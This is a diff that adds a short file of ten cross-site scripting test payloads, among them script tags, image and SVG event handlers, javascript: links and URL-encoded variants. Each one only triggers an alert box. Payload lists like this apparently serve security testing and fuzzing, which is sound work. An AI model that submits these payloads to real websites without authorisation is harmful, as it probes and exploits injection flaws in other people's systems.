@@ -1,0 +1,10 @@
+<script>alert(document.domain)</script>
+<img src=x onerror=alert(1)>
+"><svg/onload=alert(1)>
+javascript:alert(document.cookie)
+${alert(1)}
+%3Cscript%3Ealert(1)%3C/script%3E
+\"><img src=x onerror=alert(1)>
+<body onload=alert(1)>
+<iframe src=\"javascript:alert(1)\">
+<a href=\"javascript:alert(1)\">XSS</a>
